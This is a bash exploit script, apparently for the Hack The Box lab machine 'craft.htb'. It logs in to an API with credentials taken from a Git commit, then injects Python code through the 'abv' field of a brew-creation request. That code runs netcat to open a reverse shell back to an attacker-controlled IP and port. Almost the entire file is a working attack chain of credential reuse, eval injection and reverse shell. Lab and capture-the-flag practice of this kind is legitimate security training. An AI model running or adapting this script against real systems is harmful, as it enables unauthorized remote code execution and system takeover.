#!/usr/bin/env bash
# Credentials found in https://gogs.craft.htb/Craft/craft-api/commit/10e3ba4f0a09c778d7cec673f28d410b73455a86
USER=dinesh
PASS=4aUh0A8PbVJxgd

# API URLS
API=https://api.craft.htb/api
LOGIN=/auth/login
BREW=/brew/

# Retrieving auth token
TOK=$(curl -s --user $USER:$PASS $API$LOGIN -k | grep -i token | cut -d'"' -f4)
echo "Token: $TOK"

# Reverse target
LHOST=10.10.14.3
LPORT=6789

# Inject into abv
PAYLOAD="__import__('os').system('nc -nv $LHOST $LPORT -e /bin/sh -i') or 10"

curl -k -H "X-Craft-API-Token: $TOK" -H "Content-Type: application/json" -X POST $API$BREW --data "{\"name\": \"Reverse Beer\", \"brewer\": \"Pentesters Abbey\", \"style\": \"FCK\", \"abv\": \"$PAYLOAD\"}"
